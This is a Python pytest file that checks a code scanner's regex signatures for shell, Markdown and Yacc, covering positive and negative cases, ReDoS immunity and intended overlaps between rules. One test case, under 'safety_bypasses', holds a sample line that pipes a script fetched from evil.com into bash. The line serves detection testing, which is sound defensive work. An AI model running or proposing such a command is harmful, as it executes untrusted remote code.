_SHELL_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    # --- PHASE 1 ---
    ("branch", "if [[ $x -gt 5 ]]; then", "x=5"),
    ("args", 'echo "$1"', "echo hello"),
    ("structural_boundaries", "local x=1", "echo hello"),
    ("func_start", "function deploy() {", "if [ -f x ]; then"),
    # --- PHASE 2 ---
    ("safety", "trap 'cleanup' EXIT", "echo hello"),
    (
        "safety_bypasses",
        "curl https://evil.com/install.sh | bash",
        "curl https://example.com/data.json -o data.json",
    ),
    ("high_risk_execution", "rm -rf /tmp/build", "rm file.txt"),
    ("io", "curl -O https://example.com/file", "echo done"),
    ("api", "export MY_VAR=1", "local MY_VAR=1"),
    ("state_mutation", "x=5", "echo x"),
    ("dead_code", "# rm -rf /tmp", "# just a note"),
    ("doc", "# Usage: script.sh [options]", "# just a note"),
    ("test", "assertTrue $result", "echo hello"),
    # --- PHASE 3 ---
    ("concurrency", "long_running_task &", "x=1"),
    ("ui_framework", "dialog --msgbox 'hi' 10 30", "echo hi"),
    ("globals", "echo $HOME", "echo $myvar"),
    ("comprehensions", "for i in {1..10}; do", "for i in 1 2 3; do"),
    ("scientific", "result=$(( 1 + 2 ))", "result=1"),
    ("reflection_metaprogramming", "output=$(date)", "output=static"),
    ("import", "source ./lib.sh", "echo lib.sh"),
    ("ownership", "# Author: Jane Doe", "# just a note"),
    # --- PHASE 4 ---
    ("planned_debt", "# TODO: refactor", "# done"),
    ("fragile_debt", "# HACK: workaround", "# clean"),
    ("spec_exposure", "# [SPEC-123] audit tag", "# just a note"),
    ("ssr_boundaries", 'echo "Content-type: text/html"', "echo hello"),
    ("events", "mkfifo /tmp/pipe", "echo pipe"),
    ("dependency_injection", "command -v git", "echo git"),
    ("macros", "alias ll='ls -la'", "ll='ls -la'"),
    ("pointers", "declare -n ref=x", "declare x=1"),
    # --- PHASE 5 ---
    ("telemetry", "logger 'message'", "true"),
    ("debug_prints", "echo 'debug info'", "true"),
    ("panics_and_aborts", "abort", "echo done"),
    ("thread_sleeps", "sleep 5", "date"),
    ("sync_locks", "flock /tmp/lock", "echo lock"),
    ("immutability_locks", "readonly CONST=1", "local CONST=1"),
    ("cleanup", "rm -f /tmp/file", "ls /tmp/file"),
    ("encapsulation", "local x=1", "export x=1"),
    ("listeners", "nc -l 8080", "nc example.com 80"),
    ("test_skip", "# SKIP: flaky test", "# run test"),
    # --- HYBRID ---
    ("serialization_parsing", "yq eval '.foo' file.yaml", "cat file.yaml"),
    ("regex_execution", "[[ $x =~ ^[0-9]+$ ]]", "[[ $x == 'foo' ]]"),
    ("time_date_logic", "date +%Y-%m-%d", "echo today"),
    ("ipc_rpc_bridges", "ssh user@host 'ls'", "echo host"),
]


@pytest.mark.parametrize("signature,positive,negative", _SHELL_SIMPLE_CASES)
def test_shell_signature_positive_and_negative(signature, positive, negative):
    pattern = SHELL_RULES[signature]
    assert pattern is not None, f"shell's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"shell {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"shell {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_shell_dependency_capture_extracts_sourced_path():
    """
    `_dependency_capture` is the capture-group sibling of `import`, used by
    the Network Graph / Supply Chain Firewall to extract the exact sourced
    path rather than just detecting presence.
    """
    pattern = SHELL_RULES["_dependency_capture"]
    m = pattern.search("source ./lib/helpers.sh")
    assert m and m.group(1) == "./lib/helpers.sh"
    m2 = pattern.search(". ./lib/helpers.sh")
    assert m2 and m2.group(1) == "./lib/helpers.sh"
    m3 = pattern.search("if [ -f .env ]; then source .env; fi")
    assert m3 and m3.group(1) == ".env"


def test_shell_dead_code_single_comment_style_confirmed_no_second_style():
    """
    Comment-style audit (Rule 12): shell's lexical_family is `line_exclusive`
    -- it has no native block-comment syntax, only `#`. Unlike a
    `standard_block` language (which must wire `dead_code` to both `//` and
    `/* */`), there is no second comment style to audit here. This test
    documents that the check was performed, not skipped: `dead_code` fires
    on the single `#` style and there is no equivalent block-comment form
    for it to silently miss.
    """
    pattern = SHELL_RULES["dead_code"]
    assert pattern.search("# rm -rf /tmp/cache")
    assert pattern.search("    # echo debug")


def test_shell_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: because shell is `line_exclusive` (no block
    comment delimiters), none of its structural regexes track open/close
    block-comment state, so there is no "stray closing token inside a
    heredoc/string" failure mode to exploit for comment stripping the way a
    `standard_block`/`recursive_block` language's `/* ... */` tracker could
    be fooled. Every shell rule that recognizes a keyword like `fi`/`done`/
    `esac` (branch) does so via flat keyword-presence matching, not
    depth-tracking, so its behavior on a keyword sitting inside a heredoc
    body is identical to its behavior anywhere else in the executable
    payload -- there is nothing for a stray `}`/`fi` to falsely "close".
    The one place shell rules DO track a nesting depth is delimiter
    matching for `$(...)`, `<(...)`/`>(...)`, and `${...}` (safety,
    concurrency, reflection_metaprogramming) -- covered by the dedicated
    nested-delimiter regression tests below, not by comment-state tracking.
    """
    branch = SHELL_RULES["branch"]
    heredoc_body_with_fi = "cat <<EOF\nif true; then\n  echo hi\nfi\nEOF\n"
    assert branch.search(heredoc_body_with_fi), (
        "branch should still see 'if'/'fi' inside a heredoc body -- there is no "
        "block-state tracker for it to be fooled by in the first place"
    )


def test_shell_structural_boundaries_dot_source_leading_boundary_regression():
    """
    Regression test: the dot-source operator (`.`) is a non-word character,
    so it could never satisfy a shared leading `\\b` -- the exact same trap
    already documented (and fixed) on `_dependency_capture`/`import` above.
    Before the fix, `.` sat inside the big `\\b(local|...|\\.|...)\\b`
    alternation, so `. ./configfile` (the only realistic way dot-sourcing is
    written -- always preceded by whitespace or line start, both non-word)
    never matched at all. Confirmed empirically: the old pattern only
    "matched" by accident when a `.` happened to appear elsewhere in the
    line preceded by a word character (e.g. the extension dot in
    `foo.sh`), never the actual dot-source token itself.
    """
    pattern = SHELL_RULES["structural_boundaries"]
    assert pattern.search(". ./configfile"), "dot-source still didn't match"
    assert pattern.search(". /etc/profile")
    assert pattern.search("  . lib/helpers"), "indented dot-source still didn't match"
    assert pattern.search("source /etc/profile"), "source keyword form regressed"


def test_shell_safety_nested_default_expansion_regression():
    """
    Nested-delimiter regression (Rule 11): both `${...}` clauses in `safety`
    (the quoted and unquoted default-value forms) used a flat `[^}]+`/
    `[^}]*` delimiter matcher, which cannot represent one level of nesting.
    A realistic nested default-value expansion -- e.g.
    `${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}`, a common multi-level fallback
    idiom -- truncated at the first (inner) `}` instead of capturing the
    full expression. Upgraded to the one-level-nesting form from the
    project's Rule 11 playbook.
    """
    pattern = SHELL_RULES["safety"]
    m = pattern.search("${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}")
    assert m and m.group() == "${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}", (
        f"nested default expansion truncated: {m.group() if m else None!r}"
    )
    m2 = pattern.search('"${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}"')
    assert m2 and m2.group() == '"${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}"', (
        f"nested quoted default expansion truncated: {m2.group() if m2 else None!r}"
    )
    assert pattern.search("${VAR:-default}"), "non-nested form regressed"


def test_shell_safety_expansion_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: both `${...}`
    clauses' flat `[^}]+`/`[^}]*` were unbounded and unanchored -- quadratic
    on a long run of unclosed `${` (each opening candidate scans to the end
    of the payload looking for a `}` that never arrives). Confirmed genuine
    O(n^2) scaling (~4x per doubling at n=2k/4k/8k/16k/32k, e.g.
    0.015s/0.06s/0.24s/0.94s/3.5s for the unquoted clause) before being
    upgraded to the one-level-nesting form, which is linear (~2x per
    doubling) because the two alternatives never match overlapping text.
    """
    pattern = SHELL_RULES["safety"]
    assert_redos_immune(pattern, "${x:-" * 20000, timeout_sec=3.0)
    assert_redos_immune(pattern, '"${x' * 20000, timeout_sec=3.0)
    assert pattern.search("${VAR:-default}")


def test_shell_safety_trap_redos_immunity():
    """
    Regression test for a second, independent confirmed real O(n^2) ReDoS
    in the same rule: the trap clause's `[^\\n]*` was unbounded and
    unanchored -- quadratic on a single long line packed with `trap `
    occurrences that never resolve to ERR/EXIT/INT/TERM (each occurrence's
    failed match scans to the end of the line). Confirmed genuine O(n^2)
    scaling (~4x per doubling at n=1k/2k/4k/8k/16k occurrences, e.g.
    0.036s/0.14s/0.57s/2.24s/5.48s) before being bounded to {0,300}; a real
    trap statement resolving within 300 chars is generous.
    """
    pattern = SHELL_RULES["safety"]
    assert_redos_immune(pattern, "trap " * 20000, timeout_sec=3.0)
    assert pattern.search("trap 'cleanup' EXIT")
    assert pattern.search("trap 'echo error' ERR")


def test_shell_concurrency_nested_process_substitution_regression():
    """
    Nested-delimiter regression (Rule 11): `<(...)`/`>(...)` (process
    substitution) used a flat `[^)]*` delimiter matcher, which cannot
    represent one level of nesting. A realistic nested process substitution
    -- e.g. `diff <(sort <(cat a)) <(sort b)`, comparing the sorted output
    of two other process substitutions -- truncated at the first (inner)
    `)` instead of capturing the full outer substitution. Upgraded to the
    one-level-nesting form.
    """
    pattern = SHELL_RULES["concurrency"]
    m = pattern.search("diff <(sort <(cat a)) <(sort b)")
    assert m and m.group() == "<(sort <(cat a))", f"nested process substitution truncated: {m.group() if m else None!r}"
    assert pattern.search("diff <(sort a) <(sort b)"), "non-nested form regressed"


def test_shell_concurrency_process_substitution_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `<(...)`/`>(...)`'s
    flat `[^)]*` was unbounded and unanchored -- quadratic on a long run of
    unclosed `<(` (confirmed ~4x per doubling at n=2k/4k/8k/16k/32k, e.g.
    0.006s/0.024s/0.095s/0.38s/1.5s) before being upgraded to the
    one-level-nesting form, which is linear (~2x per doubling).
    """
    pattern = SHELL_RULES["concurrency"]
    assert_redos_immune(pattern, "<(" * 20000, timeout_sec=3.0)
    assert_redos_immune(pattern, ">(" * 20000, timeout_sec=3.0)
    assert pattern.search("diff <(sort a) <(sort b)")


def test_shell_reflection_metaprogramming_nested_command_substitution_regression():
    """
    Nested-delimiter regression (Rule 11): `$(...)` (command substitution)
    used a flat `[^)]+` delimiter matcher, which cannot represent one level
    of nesting. A realistic nested command substitution -- e.g.
    `DIR=$(cd "$(dirname "$0")" && pwd)`, the canonical "find my own script
    directory" idiom -- truncated at the first (inner) `)` instead of
    capturing the full outer substitution. Upgraded to the one-level-nesting
    form.
    """
    pattern = SHELL_RULES["reflection_metaprogramming"]
    m = pattern.search('DIR=$(cd "$(dirname "$0")" && pwd)')
    assert m and m.group() == '$(cd "$(dirname "$0")" && pwd)', (
        f"nested command substitution truncated: {m.group() if m else None!r}"
    )
    assert pattern.search("echo $(date)"), "non-nested form regressed"


def test_shell_reflection_metaprogramming_command_substitution_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `$(...)`'s flat
    `[^)]+` was unbounded and unanchored -- quadratic on a long run of
    unclosed `$(` (confirmed ~4x per doubling at n=2k/4k/8k/16k/32k, e.g.
    0.006s/0.024s/0.094s/0.38s/1.5s) before being upgraded to the
    one-level-nesting form, which is linear (~2x per doubling).
    """
    pattern = SHELL_RULES["reflection_metaprogramming"]
    assert_redos_immune(pattern, "$(" * 20000, timeout_sec=3.0)
    assert pattern.search("echo $(date)")


def test_shell_spec_exposure_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the trailing
    `[^\\]]*` was unbounded and unanchored -- quadratic on a long run of
    unclosed `#[SPEC-1` tags (confirmed ~4x per doubling at
    n=2k/4k/8k/16k/32k, e.g. 0.048s/0.19s/0.75s/1.83s/7.3s) before being
    bounded to {0,300}; real spec/audit tags don't get remotely that long.
    """
    pattern = SHELL_RULES["spec_exposure"]
    assert_redos_immune(pattern, "#[SPEC-1" * 20000, timeout_sec=3.0)
    assert pattern.search("# [SPEC-123] implement retry logic")
    assert pattern.search("# [audit] verify checksum")


def test_shell_cleanup_trap_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `cleanup`'s trap
    clause has the same shape as `safety`'s (see
    test_shell_safety_trap_redos_immunity) -- an unbounded `.*` before the
    required `EXIT` literal, unanchored, quadratic on a long run of `trap `
    occurrences that never resolve to EXIT (confirmed ~4x per doubling at
    n=2k/4k/8k/16k/32k, e.g. 0.013s/0.05s/0.20s/0.81s/1.96s) before being
    bounded to {0,300}.
    """
    pattern = SHELL_RULES["cleanup"]
    assert_redos_immune(pattern, "trap " * 20000, timeout_sec=3.0)
    assert pattern.search("trap 'rm -rf $TMPDIR' EXIT")
    assert pattern.search("rm -f /tmp/lockfile")


def test_shell_test_skip_comment_marker_leading_boundary_regression():
    """
    Regression test: `#\\s*SKIP` starts with `#` (non-word), so it could
    never satisfy the shared leading `\\b` -- a real `# SKIP: ...` comment
    is always preceded by whitespace or line start (both non-word), so it
    never matched at all. Pulled out of the group with the leading `\\b`
    dropped (the `#` is self-delimiting), matching the standard remedy for
    this bug class.
    """
    pattern = SHELL_RULES["test_skip"]
    assert pattern.search("# SKIP: flaky test"), "'# SKIP' comment marker still didn't match"
    assert pattern.search("  # SKIP due to CI flakiness")
    assert pattern.search("mock service_response"), "mock keyword form regressed"
    assert not pattern.search("# SKIPPED already handled elsewhere"), (
        "trailing boundary should still exclude 'SKIPPED' as a longer word"
    )


def test_shell_time_date_logic_flag_and_format_trailing_boundary_regression():
    """
    Regression test: the `date\\s+`/`sleep\\s+` alternatives required a
    word character to immediately follow the whitespace to satisfy the
    shared trailing `\\b` -- never true for how `date` is actually invoked
    in real scripts (almost always followed by a `-flag` or `+FORMAT`, both
    non-word). The single most common real-world form, `date +%Y-%m-%d`,
    never matched at all, nor did `date -u`. The trailing `\\s+` was
    redundant to begin with -- `\\b` alone already prevents partial-word
    matches like "update" -- so it was dropped entirely.
    """
    pattern = SHELL_RULES["time_date_logic"]
    assert pattern.search("date +%Y-%m-%d"), "'date +FORMAT' form still didn't match"
    assert pattern.search("date -u"), "'date -u' flag form still didn't match"
    assert pattern.search("sleep 5"), "bare sleep form regressed"
    assert not pattern.search("updated_at=1"), "'update'-shaped word incorrectly matched"


def test_shell_func_start_and_macros_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a preprocessor/macro
    construct fooling func_start, as seen with C++ macros): shell has no
    C-style macros, but `macros` maps to `alias`/`shopt` declarations. These
    require the literal `alias`/`shopt` keyword at line start and never
    produce the `name()`/`function name` shape `func_start` looks for, so
    the two never fire on the same text.
    """
    func_start = SHELL_RULES["func_start"]
    macros = SHELL_RULES["macros"]

    alias_line = "alias ll='ls -la'"
    assert macros.search(alias_line)
    assert not func_start.search(alias_line)

    func_line = "deploy() {"
    assert func_start.search(func_line)
    assert not macros.search(func_line)


def test_shell_test_and_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a `.test(`-style regex
    method miscounted as a test-framework call, as seen in TypeScript):
    verified empirically rather than assumed. Shell's `test` signature is
    scoped to unit-testing framework vocabulary (`assertTrue`, `bats`,
    `shunit2`, `@test`, the bats `run` helper) -- it does NOT include the
    shell builtin `test`/`[`/`[[` construct at all, so it structurally
    cannot collide with `regex_execution`'s `[[ $x =~ $pattern ]]` /
    `grep`/`sed`/`awk` forms. Unlike PowerShell's Pester `Should -Match`
    (a genuine, intentional double-classification), this is not an overlap
    of any kind -- the two signatures simply don't share vocabulary.
    """
    test_ = SHELL_RULES["test"]
    regex_execution = SHELL_RULES["regex_execution"]

    regex_test_construct = "[[ $x =~ ^[0-9]+$ ]]"
    assert regex_execution.search(regex_test_construct)
    assert not test_.search(regex_test_construct)

    unit_test_assertion = "assertTrue $ok"
    assert test_.search(unit_test_assertion)
    assert not regex_execution.search(unit_test_assertion)


def test_shell_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents a representative sample of the automated ambiguity sweep's
    findings for shell -- all confirmed genuine, intentional
    double-classifications via direct empirical verification, not false
    positives:

    - `structural_boundaries` <-> `encapsulation` on `local`/`declare`/
      `typeset`: these keywords are simultaneously a structural boundary
      (a straight-line declaration statement) AND an encapsulation marker
      (they scope a variable to local/function state) -- both are correct.
    - `structural_boundaries` <-> `immutability_locks` on `readonly`/
      `typeset -r`: declaring a variable read-only is simultaneously a
      structural boundary AND an immutability lock.
    - `io` <-> `ipc_rpc_bridges` on `curl`/`ssh`: a network client
      invocation is genuinely both a raw I/O operation AND an inter-process/
      remote-procedure bridge -- correctly double-classified, the same
      pattern already established for `curl`/`ssh` in other languages'
      sections of this file.
    - `safety` <-> `cleanup` on `trap '...' EXIT`: an EXIT trap is
      simultaneously defensive programming (guaranteed cleanup on exit) AND
      a resource-cleanup/teardown construct -- both are correct.
    - `high_risk_execution` <-> `panics_and_aborts` on `kill`: sending a
      signal is genuinely both a high-risk system call AND a
      forceful-execution-interrupt construct.
    """
    structural_boundaries = SHELL_RULES["structural_boundaries"]
    encapsulation = SHELL_RULES["encapsulation"]
    immutability_locks = SHELL_RULES["immutability_locks"]
    io = SHELL_RULES["io"]
    ipc_rpc_bridges = SHELL_RULES["ipc_rpc_bridges"]
    safety = SHELL_RULES["safety"]
    cleanup = SHELL_RULES["cleanup"]
    high_risk_execution = SHELL_RULES["high_risk_execution"]
    panics_and_aborts = SHELL_RULES["panics_and_aborts"]

    local_decl = "local env=$1"
    assert structural_boundaries.search(local_decl)
    assert encapsulation.search(local_decl)

    readonly_decl = "readonly VERSION=1.2.3"
    assert structural_boundaries.search(readonly_decl)
    assert immutability_locks.search(readonly_decl)

    curl_call = "curl -s https://api.example.com/data"
    assert io.search(curl_call)
    assert ipc_rpc_bridges.search(curl_call)

    exit_trap = "trap 'rm -rf $TMPDIR' EXIT"
    assert safety.search(exit_trap)
    assert cleanup.search(exit_trap)

    kill_call = "kill -HUP $pid"
    assert high_risk_execution.search(kill_call)
    assert panics_and_aborts.search(kill_call)


# ==============================================================================
# MARKDOWN: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #597)
# ==============================================================================
MARKDOWN_RULES = LANGUAGE_DEFINITIONS["markdown"]["rules"]

_MARKDOWN_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("lit_code_blocks", "```python\ndef hello():\n    print('hi')\n```", "    ```python\nindented code block\n    ```"),
    ("lit_diagrams", "```mermaid\ngraph TD;\n    A-->B;\n```", "```python\nprint('not a diagram')\n```"),
    ("lit_headers", "# Main Architecture Title", "####### Not a valid Markdown header"),
    ("lit_links", "[GitGalaxy](https://github.com/squid-protocol/gitgalaxy)", "(https://github.com/without-brackets)"),
]


@pytest.mark.parametrize("signature,positive,negative", _MARKDOWN_SIMPLE_CASES)
def test_markdown_signature_positive_and_negative(signature, positive, negative):
    pattern = MARKDOWN_RULES[signature]
    assert pattern is not None, f"markdown's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"markdown {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"markdown {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_markdown_lit_links_nested_delimiter_regression():
    r"""
    Regression test for Issue #597 (Rule 11 nested-delimiter defect):
    1. `lit_links`'s URL portion previously used `[^)]+`, which stopped at the
       first closing parenthesis when encountering URLs containing internal
       parens (e.g., Wikipedia disambiguation links like `[Foo](http://.../Bar_(baz))`).
       This caused the matched string to silently truncate before the URL's final `)`.
    2. `lit_links`'s link text portion previously used `[^\]]+`, which broke on
       one-level nested brackets in link text (e.g., `[badge [v1.0]](https://...)`).
    """
    pattern = MARKDOWN_RULES["lit_links"]

    # 1. Wikipedia-style disambiguation URL with internal parentheses
    wiki_link = "See [Foo (bar)](https://en.wikipedia.org/wiki/Foo_(bar)) for details."
    m = pattern.search(wiki_link)
    assert m is not None, "Failed to match Wikipedia-style link with internal parens"
    assert m.group(0) == "[Foo (bar)](https://en.wikipedia.org/wiki/Foo_(bar))", (
        f"Link match was truncated: {m.group(0)!r}"
    )

    # 2. Nested brackets in link text
    nested_bracket_link = "Check out [release [v2.0]](https://github.com/org/repo/releases/v2.0) now."
    m_bracket = pattern.search(nested_bracket_link)
    assert m_bracket is not None, "Failed to match link with nested brackets in text"
    assert m_bracket.group(0) == "[release [v2.0]](https://github.com/org/repo/releases/v2.0)"


def test_markdown_lit_code_blocks_formatting_and_indentation_regression():
    """
    Regression test for `lit_code_blocks`. Uses single-line opening-fence-only
    snippets (not multi-line blocks with a closing fence) -- the old regex
    `^[a-zA-Z0-9]*$` couldn't match a non-alphanumeric *opening* fence line,
    but a multi-line snippet's bare closing ` ``` ` line incidentally
    satisfies it anyway (zero alphanumeric chars after the backticks still
    matches `[a-zA-Z0-9]*`), which would make a whole-snippet `.search()`
    silently pass against the unfixed regex too. Testing the opening fence
    line in isolation is the only way these assertions actually discriminate
    old vs. new behavior.
    1. Previously `^[a-zA-Z0-9]*$` failed to match language info strings with non-alphanumeric
       characters such as `c++`, `c#`, `objective-c`, `shell-script`.
    2. Failed to match info strings with parameters or titles (e.g., ` ```python title="app.py" `).
    3. Failed to match 4+ backtick fences (` ```` ````).
    4. Required strict 0-3 space indentation handling (4 spaces turn a fence into literal code in CommonMark).
    """
    pattern = MARKDOWN_RULES["lit_code_blocks"]

    # Non-alphanumeric language info strings (opening fence line only)
    assert pattern.search("```c++")
    assert pattern.search("```c#")
    assert pattern.search("```objective-c")
    assert pattern.search("```shell-script")

    # Code fence with attributes / title (opening fence line only)
    assert pattern.search('```python title="main.py" hl_lines="1-3"')

    # 4+ backticks (opening fence line only)
    assert pattern.search("````python")

    # Indentation: 0-3 spaces allowed, 4 spaces excluded (opening fence line only)
    assert pattern.search("   ```python")
    assert not pattern.search("    ```python"), (
        "lit_code_blocks matched a 4-space indented code fence (which is literal code text in CommonMark)"
    )


def test_markdown_lit_diagrams_case_insensitivity_and_indentation_regression():
    """
    Regression test for `lit_diagrams`:
    1. Previously `^(?:mermaid|plantuml)$` failed on capitalized diagram tags (`Mermaid`, `PlantUML`, `MERMAID`).
    2. Failed on diagram fences with titles or parameters (e.g., ` ```mermaid title="Architecture" `).
    3. Excludes 4-space indented blocks.
    """
    pattern = MARKDOWN_RULES["lit_diagrams"]

    assert pattern.search("```Mermaid\ngraph TD;\n    A-->B;\n```")
    assert pattern.search("```PlantUML\n@startuml\n@enduml\n```")
    assert pattern.search('```MERMAID title="Flow"\ngraph LR;\n```')

    assert pattern.search("  ```mermaid\n2-space indent\n  ```")
    assert not pattern.search("    ```mermaid\n4-space indent\n    ```")


def test_markdown_lit_headers_multiline_and_boundary_regression():
    r"""
    Regression test for `lit_headers`. The one genuine bug: previously
    `^#{1,6}\s+` in `re.M` mode matched newlines (`\s` includes `\n`), so a
    standalone `#` at end of line plus the following line's leading
    whitespace got consumed as the required `\s+`, falsely classifying a
    bare trailing `#` as a header (Rule 5 violation). Fixed by requiring
    `[ \t]+` instead of `\s+`.

    The 7+-hash, `#123`, and `#hashtag` exclusions below were already
    correctly handled by the original regex (the `{1,6}` quantifier and the
    required `\s+`/`[ \t]+` after it already excluded them) -- they're kept
    here as forward-looking correctness coverage, not because they were
    ever broken, so a future change to the quantifier bounds can't
    regress them silently. The `#\n` case and the second genuine bug below
    (indented headers) are the true regressions against the pre-fix regex.

    The second genuine bug: the pre-fix regex had no leading-indentation
    tolerance at all, so a 1-3 space indented header (legal in CommonMark)
    never matched -- `^#{1,6}` requires `#` at the true line start, and any
    leading space there fails the anchor. The fixed regex adds `[ \t]{0,3}`
    to correctly include 1-3 space indents while still excluding 4-space
    (which CommonMark treats as literal text, not a header) -- both old and
    new regex already excluded the 4-space case, for the same structural
    reason, so that specific assertion is pre-existing-correct coverage,
    not a regression guard either.
    """
    pattern = MARKDOWN_RULES["lit_headers"]

    # Indentation regression: 1-3 space indented headers now correctly
    # match (previously excluded entirely -- see docstring).
    assert pattern.search("# Level 1 Header")
    assert pattern.search("   ### Level 3 Header (3-space indent)")

    # The actual regression: standalone `#` at line end no longer leaks across
    # the newline into the next line's content.
    assert not pattern.search("#\nStandalone hash followed by newline"), (
        "lit_headers matched #\\n across line boundary (Rule 5 multiline \\s+ defect)"
    )

    # Pre-existing correct exclusions (not regressions -- see docstring), kept
    # as forward-looking coverage.
    assert not pattern.search("####### 7 Hashes"), "lit_headers matched 7 hashes"
    assert not pattern.search("#123"), "lit_headers matched an issue reference #123"
    assert not pattern.search("#hashtag"), "lit_headers matched a hashtag #hashtag"

    # Pre-existing correct exclusion (not a regression -- see docstring):
    # 4-space indented lines are literal text in CommonMark, not headers,
    # and both old and new regex already excluded them.
    assert not pattern.search("    # Indented 4 spaces"), "lit_headers matched a 4-space indented header"


def test_markdown_redos_immunity():
    """
    Verifies ReDoS immunity for all Markdown rules under pathological unclosed payloads.
    """
    assert_redos_immune(MARKDOWN_RULES["lit_links"], "[" * 20000, timeout_sec=3.0)
    assert_redos_immune(MARKDOWN_RULES["lit_links"], "[link](" * 20000, timeout_sec=3.0)
    assert_redos_immune(MARKDOWN_RULES["lit_code_blocks"], "`" * 20000, timeout_sec=3.0)
    assert_redos_immune(MARKDOWN_RULES["lit_diagrams"], "`" * 20000, timeout_sec=3.0)
    assert_redos_immune(MARKDOWN_RULES["lit_headers"], "#" * 20000, timeout_sec=3.0)


def test_markdown_ambiguity_sweep_intentional_overlaps():
    """
    Ambiguity Sweep Report for Markdown:
    1. `lit_diagrams` <-> `lit_code_blocks`:
       A diagram fence (e.g. ` ```mermaid `) matches BOTH `lit_diagrams` AND `lit_code_blocks`.
       Conclusion: This is EXPECTED and CORRECT. A diagram block in Markdown is a specialized subtype of
       fenced code block. GitGalaxy's structural analysis engine counts signatures independently as
       multi-metric frequency features, not as a mutually-exclusive tokenizer.
    2. `lit_code_blocks` / `lit_diagrams` <-> `lit_links`:
       A Markdown link written inside a code block (e.g. ` ```python\n# See [Doc](http://example.com)\n``` `)
       will trigger `lit_links` when the file is scanned.
       Conclusion: This is EXPECTED and CORRECT. GitGalaxy signatures measure absolute structural feature
       density across documents without running heavy lexical context scoping.
    """
    code_blocks = MARKDOWN_RULES["lit_code_blocks"]
    diagrams = MARKDOWN_RULES["lit_diagrams"]
    links = MARKDOWN_RULES["lit_links"]

    diagram_snippet = "```mermaid\ngraph TD;\n    A-->B;\n```"
    assert diagrams.search(diagram_snippet), "lit_diagrams should match diagram block"
    assert code_blocks.search(diagram_snippet), (
        "lit_code_blocks should ALSO match diagram block (intentional double-classification)"
    )

    code_with_link = "```markdown\nCheck out [GitGalaxy](https://github.com/org/repo)\n```"
    assert code_blocks.search(code_with_link)
    assert links.search(code_with_link), (
        "lit_links should match link inside code block (intentional independent multi-metric scanning)"
    )


def test_markdown_adversarial_edge_cases():
    """
    Adversarial edge-case sweep for Markdown signatures:
    1. lit_links: Query parameters, fragment anchors, complex parens, space exclusions.
    2. lit_code_blocks: Info strings with leading spaces, attribute params, inline backticks exclusion.
    3. lit_diagrams: Case variations, title attributes, non-diagram exclusions.
    4. lit_headers: Closed ATX headers, 0-3 space indentation, issue/hashtag exclusions.
    """
    links = MARKDOWN_RULES["lit_links"]
    code_blocks = MARKDOWN_RULES["lit_code_blocks"]
    diagrams = MARKDOWN_RULES["lit_diagrams"]
    headers = MARKDOWN_RULES["lit_headers"]

    # --- 1. lit_links ---
    # URL with query parameters & anchor fragment
    m1 = links.search("[API Query](https://api.example.com/v1/search?q=git&lang=py#results)")
    assert m1 is not None and m1.group(0) == "[API Query](https://api.example.com/v1/search?q=git&lang=py#results)"

    # URL with balanced internal query parens
    m2 = links.search("[Spec](https://example.org/path?filter=(type:alert))")
    assert m2 is not None and m2.group(0) == "[Spec](https://example.org/path?filter=(type:alert))"

    # Link with 1-level nested brackets in text (Rule 11 standard boundary)
    m3 = links.search("[badge [v1.0]](https://example.com)")
    assert m3 is not None and m3.group(0) == "[badge [v1.0]](https://example.com)"

    # Exclusions
    assert not links.search("[unclosed link](http://example.com"), "matched unclosed URL paren"
    assert not links.search("[spaced link] (http://example.com)"), "matched link with space before URL paren"

    # --- 2. lit_code_blocks ---
    assert code_blocks.search("```   python"), "failed on fence with spaces before info string"
    assert code_blocks.search("```bash exec=true env=prod"), "failed on fence with parameters"
    assert not code_blocks.search("   `inline_code`"), "matched inline single-backtick code"
    assert not code_blocks.search("    ```python"), "matched 4-space indented code block"

    # --- 3. lit_diagrams ---
    assert diagrams.search('```PlantUML title="Architecture"'), "failed on PlantUML with title attribute"
    assert diagrams.search("```Mermaid"), "failed on capitalized Mermaid"
    assert not diagrams.search("```python\nprint('hi')\n```"), "matched python code block as diagram"

    # --- 4. lit_headers ---
    assert headers.search("# Header 1"), "failed level 1 header"
    assert headers.search("###### Header 6"), "failed level 6 header"
    assert headers.search("  ### Closed Header ###"), "failed closed ATX header"
    assert not headers.search("####### Header 7"), "matched 7-hash non-header"
    assert not headers.search("#12345"), "matched issue number #12345"
    assert not headers.search("#hashtag"), "matched hashtag #hashtag"
    assert not headers.search("#\nBare hash followed by line break"), "matched bare # across line break"


# ==============================================================================
# YACC: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #616)
# ==============================================================================
YACC_RULES = LANGUAGE_DEFINITIONS["yacc"]["rules"]

_YACC_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    # --- PHASE 1 ---
    ("branch", 'if (state == ERROR) { yyerror("bad state"); }', "int x = 1;"),
    ("args", "$$ = $1 + $2;", "int x = 1;"),
    ("structural_boundaries", "%token NUMBER\n", "int x = 1;"),
    (
        "func_start",
        "expr:\n    expr '+' term { $$ = $1 + $3; }\n    | term\n    ;\n",
        "%token NUMBER\n",
    ),
    # --- PHASE 2 ---
    ("safety", "assert(x != NULL);", "int x = 1;"),
